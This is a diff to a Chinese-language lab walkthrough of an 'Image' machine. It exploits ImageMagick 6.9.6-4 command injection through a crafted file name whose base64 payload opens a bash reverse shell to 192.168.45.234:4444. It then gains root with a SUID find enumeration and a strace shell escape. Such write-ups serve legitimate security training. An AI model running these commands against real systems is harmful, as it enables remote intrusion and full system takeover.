@@ -1,5 +1,5 @@
 ---
-description: 中等 / ImageMagick 6.9.6-4 / shell命令注入
+description: 中等 / ImageMagick 6.9.6-4 / shell命令注入 / SUID提权
 ---
 
 # ✔️ Image
@@ -65,26 +65,34 @@ cp test.png '|test"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC80NDQ0IDA
 
 ### 本地信息收集
 
+* 简单手动枚举一下：
 
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
 
-
+<figure><img src="../.gitbook/assets/12 (13).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
+* 根据枚举结果发现有很多文件设置了SUID位，运气很好，第一个strace就在GTFOBins中找到了对应可以提权的命令：
 
-
-
+<figure><img src="../.gitbook/assets/13 (14).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
+* 直接使用该命令提权成功，ROOT!
 
+```bash
+strace -o /dev/null /bin/sh -p
+```
 
+<figure><img src="../.gitbook/assets/14 (12).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/15 (11).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+<figure><img src="../.gitbook/assets/16 (9).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-本例属于简单级别的机器，端口开放的少，不用太多枚举就能锁定漏洞，构建文件名需要多次尝试但其利用过程简单。
+本例属于简单级别的机器，端口开放的少，不用太多枚举就能锁定漏洞，构建文件名需要多次尝试但其利用过程简单。提权过程也很简单，常规的手动枚举即可找到可以利用的点。
 {% endhint %}
